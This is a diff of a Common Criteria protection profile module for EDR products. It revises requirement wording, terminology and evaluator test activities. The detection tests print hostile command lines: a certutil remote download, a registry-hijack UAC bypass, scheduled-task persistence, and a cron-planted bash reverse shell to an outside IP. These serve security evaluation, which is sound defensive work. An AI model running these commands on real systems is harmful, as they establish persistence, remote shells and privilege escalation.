@@ -31,22 +31,26 @@
         linkend="CC"/>, and defines functional and assurance requirements for such products. EDR is
       enterprise management software that collects endpoint host data to detect potentially
       unauthorized activity on endpoints and to enable threat hunting and other incident response
-      actions to remediate malicious behaviors. These requirements cover basic security
-      characteristics and behaviors for EDR products that operate in either a cloud or on-premises
-      scenario. The platform on which the EDR runs may be a physical or virtual Operating System
-      (OS) on-premises or in a cloud environment. <h:br/>
+      actions to remediate malicious behaviors. These requirements cover basic security characteristics 
+      and behaviors for EDR products; the platform on which the EDR runs may be a physical or virtual 
+      Operating System (OS), and on-premises or in a cloud environment. <h:br/>
       <h:br/> EDR products rely on additional software running on the endpoint, called the Host
       Agent, to communicate commands or policy changes and to receive endpoint host data. Security
       requirements for the Host Agent are addressed in the separate <cite linkend="bibHAGT"/>
-      Module. Evaluation of an EDR system will require multiple evaluations of different system
+      Module. Evaluation of an EDR system will require evaluation of different system components 
+      consisting of EDR and <cite linkend="bibHAGT"/>. The evaluation must satisfy the requirements 
+      in both the [MOD_EDR_V1.0] and the [MOD_HA_V1.0] in addition to the Base-PP [PP APP V1.3].
+      
+      
+      Evaluation of an EDR system will require multiple evaluations of different system
       components: one against this ESM EDR Module for the EDR server software and at least one other
       against the <cite linkend="bibHAGT"/> Module with its base <cite linkend="bibAppPP"/>. <h:br/>
       <h:br/> There are two primary architectural categories addressed by requirements in this
-      PP-Module, as seen in the figure below.
-      <h:ol>
+      PP-Module, as seen in Figure 1.
+      <h:ul>
         <h:li>Endpoints communicate over the Internet to an EDR hosted by a cloud service provider (Software as a Service).</h:li>
         <h:li>Endpoints communicate with an on-premises EDR in a hub and spoke network model.</h:li>
-      </h:ol>
+      </h:ul>
       <figure entity="images/edr_archi.png" title="Primary EDR Architectures" id="toe"/>
     </section>
     <tech-terms>
@@ -84,7 +88,7 @@
         <h:i>TOE</h:i> and <h:i>EDR</h:i> are interchangeable in this
         document.
       </term>
-      <term full="Endpoint Detection and Response" abbr="EDR">EDR and its complementary Host Agent.</term>
+      <term full="Enroll">The act of registering a HA endpoint with the EDR.</term>
       <term abbr="FIPS" full="Federal Information Processing Standards"/>
       <term abbr="DSS" full="Digital Signature Standard"/>
       <term abbr="HMAC" full="Hash-based Message Authentication Code"/>
@@ -149,14 +153,14 @@
         web server software used to serve a web application or dashboard, and the underlying
         operating system or cloud platform. The figure below shows EDR (right) communicating with
         its Host Agent (left) over an untrusted network. <h:br/> The requirements for the Host Agent
-        are not covered in this Module, however it is expected that an EDR System will evaluate once
-        against this ESM EDR Module for the EDR and at least once more against the <cite
+        are not covered in this Module, however it is expected that an ESM System will evaluate
+        against this ESM EDR Module for the EDR and the <cite
           linkend="bibHAGT"/> Module with its base <cite linkend="bibAppPP"/>. <figure
           entity="images/edr_overview.png" title="EDR and Host Agent Communications" id="toe"/>
       </subsection>
       <subsection title="TOE Platform" id="TOEplatform"> The TOE platform, which consists of the
-        Operating System or Cloud platform on which the EDR software executes and is outside the
-        scope of evaluation. At the same time, the security of the EDR relies upon it. <h:br/> Any
+        OS or Cloud platform on which the EDR software executes and is outside the
+        scope of evaluation. However, the security of the EDR relies upon it. <h:br/> Any
         communications with trusted remote file reputation or threat intelligence services is
         relevant to overall EDR System security but is also outside the scope of evaluation.
       </subsection>
@@ -282,7 +286,8 @@
       <assumptions>
         <assumption id="A.CONNECTIVITY">
           <description>The <abbr linkend="EDR"/> relies on network connectivity to carry out its
-          management activities. The <abbr linkend="EDR"/> will robustly handle instances when
+          management activities. The OE will provide reliable network connectivity for the <abbr linkend="EDR"/> to operate.
+            The <abbr linkend="EDR"/> will robustly handle occasional instances when
           connectivity is unavailable or unreliable.</description>
           <objective-refer ref="OE.RELIABLE_TRANSIT">
             <rationale>The Operational Environment objective OE.RELIABLE_TRANSIT is realized through
@@ -457,11 +462,11 @@
                 of management dashboard alert capabilities the <abbr linkend="EDR"/> must be capable
                 of displaying to an authorized user. <h:br/><h:br/>
                 Examples of Detection of potentially unauthorized activity on enrolled endpoints include;
-                anomalous activity, escalation of privileges, and lateral movemen.
+                anomalous activity, escalation of privileges, and lateral movement.
               </note>
               <aactivity>
                 <TSS>The evaluator shall examine the TSS to ensure that it describes how alerts for changes in Host Agent
-                  enrollment status and potentially unauthorized activities are detected and displayed.
+                  enrollment status and potentially unauthorized activities on enrolled endpoints are detected and displayed.
                 </TSS>
                 <Guidance> The evaluator shall review operational guidance to ensure that it
                   contains documentation on enrolling and unenrolling Host Agents from the
@@ -469,7 +474,7 @@
                   list of unauthorized activity types categorized or labeled by the EDR upon
                   detection. <h:br/><h:br/> 
                 The evaluator shall ensure guidance includes any needed configuration information for displaying alerts 
-                  in relation to for changes in Host Agent enrollment status and potentially unauthorized activities.
+                  in relation to changes in Host Agent enrollment status and potentially unauthorized activities.
                 </Guidance>
                 <Tests>The evaluator shall perform the following tests:<h:br/><h:br/> The evaluator
                   shall follow guidance to enroll a Host Agent to the EDR and verify that the
@@ -481,19 +486,19 @@
                   <testlist>
                     <test>The evaluator shall open a Windows command prompt as a user and run the
                       command <h:code>cmd /c certutil -urlcache -split -f &#60;remote file&#62;
-                        &#60;download directory&#62;</h:code> where remote file is a valid file path
-                      to an accessible, remotely stored executable, and download directory is a
+                        &#60;download directory&#62;</h:code>, where the remote file is a valid file path
+                      to an accessible, remotely stored executable, and the download directory is a
                       valid directory path writable by the current local user. </test>
                     <test>The evaluator shall open a Windows command prompt as a user and run the
                       command <h:code>reg.exe add hkcu\software\classes\mscfile\shell\open\command
-                        /ve /d "&#60;local executable&#62;" /f</h:code> where local executable is a
+                        /ve /d "&#60;local executable&#62;" /f</h:code>, where the local executable is a
                       valid file path to a readable, local executable. The evaluator will then run
                       the command <h:code>cmd.exe /c eventvwr.msc</h:code> in the same command
                       prompt window. </test>
                     <test>The evaluator shall open a Windows command prompt as a user and run the
                       command <h:code>SCHTASKS /Create /SC ONCE /TN spawn /TR &#60;local
-                        executable&#62;" /ST &#60;time&#62;</h:code> where local executable is a
-                      valid file path to a readable, local executable and time is a start time that
+                        executable&#62;" /ST &#60;time&#62;</h:code>, where the local executable is a
+                      valid file path to a readable, local executable, and time is a start time that
                       occurs within minutes of the task being created. </test>
                   </testlist>
                   <h:b>For Linux,</h:b> the evaluator shall test the EDR's ability to detect
@@ -503,8 +508,8 @@
                   <testlist>
                     <test>The evaluator shall open a terminal and run the command <h:code>scp
                     &#60;remote user&#62;@&#60;remote host&#62;:&#60;remote path&#62;
-                    &#60;download directory&#62;</h:code> where remote user is a valid user on
-                    remote host, remote path is a valid path to a remotely stored executable, and
+                    &#60;download directory&#62;</h:code>, where the remote user is a valid user on
+                    remote host, remote path is a valid path to a remotely stored executable, and the 
                     download directory is a valid directory path writable by the current local
                     user. The remote user's password shall be provided when prompted. </test>
                     <test>The evaluator shall open a terminal and run the command <h:code>sudo chown
@@ -514,7 +519,7 @@
                     The user's administrative password shall be provided when prompted.</test>
                     <test>The evaluator shall open a terminal and run the command <h:code>echo
                       "bash -i >&amp; /dev/tcp/&#60;outside IP&#62;/5050 0>&amp;1 1 &amp;" &#62; 
-                    /etc/cron.hourly/persist;</h:code> where outside IP is a valid
+                    /etc/cron.hourly/persist</h:code>, where the outside IP is a valid
                       external address.</test>
                   </testlist>
                   
@@ -543,12 +548,12 @@
                 required to be interactive. </note>
               <aactivity>
                 <TSS>
-The evaluator shall examine the TSS to ensure that it describes how visualizations are displayed, what content is included, and what ingormation is presented.</TSS>
+The evaluator shall examine the TSS to ensure that it describes how alert visualizations are displayed, what content is included, and what information is presented.</TSS>
                 <Guidance> The evaluator shall review the operational guidance to ensure that it
                   contains documentation on using the management portal to visualize and view
                   alerts. </Guidance>
                 <Tests> The evaluator shall review an alert on the management portal and verify that
-                  the alert contains a severity field and the field(s) selected from the requirement
+                  the alert contains a severity field and the fields selected from the requirement
                   selection. The evaluator will open or view the alert and verify that a timeline of
                   events is available for review. The timeline shall show a progression of events
                   over time. </Tests>
@@ -565,15 +570,14 @@ The evaluator shall examine the TSS to ensure that it describes how visualizatio
                   <selectable>Log Event Extended Format (LEEF)</selectable>
                 </selectables>. </title>
               <note role="application"> The intent of this requirement is to specify a selection of
-                standards-based formats the EDR must provide for the export of selected alerts. </note>
+                standards-based formats the EDR must provide for the export of selected alerts, at least one must be selected. </note>
               <aactivity>
                 <TSS>
 The evaluator shall examine the TSS to ensure that it describes what formats are supported.</TSS>
                 <Guidance>The evaluator shall review the operational guidance to ensure that it
-                  contains documentation on the products supported for exporting alerts in standards
-                  based formats.</Guidance>
+                  contains documentation on the products supported for exporting alerts in standards-based formats.</Guidance>
                 <Tests> The evaluator shall pick an alert on the management portal and export the
-                  alert in every format possible. The evaluator shall review the operational
+                  alert in every selected format. The evaluator shall review the operational
                   guidance and the selection from the requirement and verify that export options
                   exist for all the declared formats in the selection. After exporting one alert for
                   each possible format the evaluator shall review the file contents of the exported
@@ -666,17 +670,15 @@ The evaluator shall examine the TSS to ensure that it describes what formats are
                 of audit records collected about actions on the management dashboard. </note>
               <aactivity>
                 <TSS>
-                  The evaluator shall examine the TSS to ensure that it describes all events that generate log data.</TSS>
+                  The evaluator shall examine the TSS to ensure that it describes all events that generate log data and that those events include those listed in the SFR.</TSS>
                 <Guidance> The evaluator shall check the administrative guide and ensure that it
-                  lists all of the collectable types of endpoint event data. The evaluator shall
-                  check to make sure that every endpoint event data type selected in the ST is
-                  included in the administrative guidance.</Guidance>
+                  lists any configuration information related to auditable events.</Guidance>
                 <Tests>The evaluator shall perform the following tests:
                   <testlist>
                     <test>The evaluator shall login to the EDR management dashboard and verify that audit
                       log data describing the activity is recorded.</test>
                     <test>The evaluator shall issue a valid remediation command provided by the EDR to
-                      a Host Agent and verify that audit log data describing the activity is recorded.</test>
+                      a Host Agent and verify that audit log data describing the activity is recorded on the EDR management dashboard.</test>
                     <test>The evaluator shall change a non-destructive EDR configuration option within the EDR management
                       dashboard, change it back to the original setting, and verify that the audit log data describing
                       the activity is recorded.</test>
@@ -739,13 +741,12 @@ The evaluator shall examine the TSS to ensure that it describes what formats are
                   linkend="TOE"/>; they may optionally list additional special characters supported
                 using the assignment. </note>
               <aactivity>
-                <TSS>There are no TSS activities for this requirement. </TSS>
+                <TSS>The evaluator shall verify the TSS includes all the supported characters, rules, and limitations used by the EDR and that they meet the reuqirements of the SFR.</TSS>
                 <Guidance>The evaluator shall review the operational guidance to ensure that it
                   contains documentation on default password policy.</Guidance>
                 <Tests>The evaluator shall perform the following tests:
                   <testlist>
-                    <test>The evaluator shall attempt to modify a user's password to be less than 14 characters
-                    in length.</test>
+                    <test>The evaluator verify that passwords up to 64 characters are supported.</test>
                     <test> The evaluator shall verify that password composition rules present in operational guidance
                       are enforced. While the evaluator is not required (nor is it feasible) to test all possible
                       composition rules, the evaluator shall ensure that all characters, and rule characteristics
@@ -776,12 +777,12 @@ The evaluator shall examine the TSS to ensure that it describes what formats are
                   <selectable>authentication with external Smartcard and PIN</selectable>
                   <selectable>no other factors</selectable>
                 </selectables> to support logins to any management portal, dashboard, or API. </title>
-              <note role="application"> </note>
+              <note role="application">The selection specifies if Smartcards are also supported, one selection must be made.</note>
               <aactivity>
                 <TSS>There are no TSS activities for this requirement.</TSS>
                 <Guidance>The evaluator shall review the operational guidance to ensure that it
                   contains documentation on configuring any supported authentication mechanisms and any support for 
-                  multi-factor authentication.</Guidance>
+                  multifactor authentication.</Guidance>
                 <Tests>The evaluator shall create an account with a username and password, verifying
                   that login authentication is case-sensitive. If additional factors are provided, each
                   factor shall be tested for login access with strictly unanimous authentication for those
@@ -852,7 +853,7 @@ The evaluator shall examine the TSS to ensure that it describes what formats are
                   <manager id="s">SOC Analyst</manager>
                   <manager id="u">Read-Only User</manager>
                   <management-function>
-                    <text>Configure the amount of time to retain collected EDR data
+                    <text>Configure the amount of time to retain data collected by the EDR
                         <assignable>time frame to retain data</assignable>
                     </text>
                     <M ref="a"/><O ref="s"/><_ ref="u"/>
@@ -936,8 +937,8 @@ The evaluator shall examine the TSS to ensure that it describes what formats are
                 <TSS> The evaluator shall examine the <abbr linkend="TSS"/> to verify that it
                   describes the roles and the powers granted to and limitations of the role. </TSS>
                 <Guidance> The evaluator shall review the operational guidance to ensure that it
-                  contains instructions for administering the <abbr linkend="EDR"/> and which user
-                  roles are supported and which permissions each default role has.</Guidance>
+                  contains instructions for administering the <abbr linkend="EDR"/>, which user
+                  roles are supported, and which permissions each default role has.</Guidance>
                 <Tests>
                   <testlist>
                     <test>The evaluator shall verify that the roles of administrator, SOC analyst, and
@@ -1002,7 +1003,7 @@ The evaluator shall examine the TSS to ensure that it describes what formats are
               </title>
               <note role="application"> This requirement captures all the remediation functionality
                 the <abbr linkend="EDR"/> provides the SOC Analyst and optionally the Administrator.
-                <h:br/><h:br/>Logically quarentine from the network refers to restricting communications from the endpoint to the rest of the network.
+                <h:br/><h:br/>Logically quarentine from the network refers to restricting communications from the endpoint to the rest of the network, it may include a restricted whitelist.
                
                 <h:br/><h:br/>
                 Chart legend: X = Mandatory, O = Optional, - = N/A</note>
@@ -1110,11 +1111,11 @@ The evaluator shall examine the TSS to ensure that it describes what formats are
                 <selectable id="ITC_HTTPS_2">HTTPS as defined in the Base-PP</selectable>
               </selectables> to provide a trusted communication channel between itself and another
                 trusted IT product that is logically distinct from other communication channels,
-                provides assured identification of its end points, protects channel data from
+                provides assured identification of its endpoints, protects channel data from
                 disclosure, and detects modification of the channel data. </title>
               <note role="application"> The intent of the above requirement is to use the
                 cryptographic protocols identified in the requirement to establish and maintain a
-                trusted channel between the <abbr linkend="EDR"/> and the Host Agent. Only TLS, or
+                trusted channel between the <abbr linkend="EDR"/> and the Host Agent. Only TLS or
                 HTTPS can be used in this trusted channel. <h:br/><h:br/> This requirement is to
                 ensure that the transmission of any logs, process lists, system information, etc,
                 when commanded, or at configurable intervals, is properly protected. This trusted
@@ -1152,7 +1153,7 @@ The evaluator shall examine the TSS to ensure that it describes what formats are
                   communications are protected. The evaluator shall also confirm that all protocols
                   listed in the <abbr linkend="TSS"/> in support of remote <abbr linkend="TOE"/>
                   administration are consistent with those specified in the requirement, and are
-                  included in the requirements in the <abbr linkend="ST"/>. </TSS>
+                  included in the requirements in the ST. </TSS>
                 <Guidance> The evaluator shall confirm that the operational guidance contains
                   instructions for configuring the communication channel between the Host Agent and
                   the <abbr linkend="EDR"/> for each supported method. <Tests>
@@ -1181,8 +1182,8 @@ The evaluator shall examine the TSS to ensure that it describes what formats are
                   <selectable id="FTP_TLS_2">TLS as defined in the TLS Package</selectable>
                   <selectable id="FTP_HTTPS_2">HTTPS as defined in the Base-PP</selectable>
                 </selectables> to provide a trusted communication path between itself and remote
-                administrators that is logically distinct from other communication paths and
-                provides assured identification of its endpoints and protection of the communicated
+                administrators that is logically distinct from other communication paths,
+                provides assured identification of its endpoints, and protects the communicated
                 data from modification and disclosure.</title>
             </f-element>
             <f-element>
@@ -1220,7 +1221,7 @@ The evaluator shall examine the TSS to ensure that it describes what formats are
                       <test> The evaluators shall ensure that communications using each specified
                         (in the operational guidance) remote administration method is tested during
                         the course of the evaluation, setting up the connections as described in the
-                        operational guidance and ensuring that communication is successful </test>
+                        operational guidance and ensuring that communication is successful. </test>
                       <test> For each method of remote administration supported, the evaluator shall
                         follow the operational guidance to ensure that there is no available
                         interface that can be used by a remote user to establish remote
@@ -1270,7 +1271,7 @@ The evaluator shall examine the TSS to ensure that it describes what formats are
             <aactivity>
               <TSS>The evaluator shall check to ensure that the TSS describes how all commands and policies are signed.</TSS>
               <Guidance>The evaluator shall review the operational guidance and ensure that the
-                <abbr linkend="EDR"/> implements all documented forms of remediation.
+                <abbr linkend="EDR"/> any configuration information for policy signing is included.
               </Guidance>
               <Tests>The evaluator shall select any one remediation function documented in the
                 administrative guide (e.g., terminate process), and execute that command
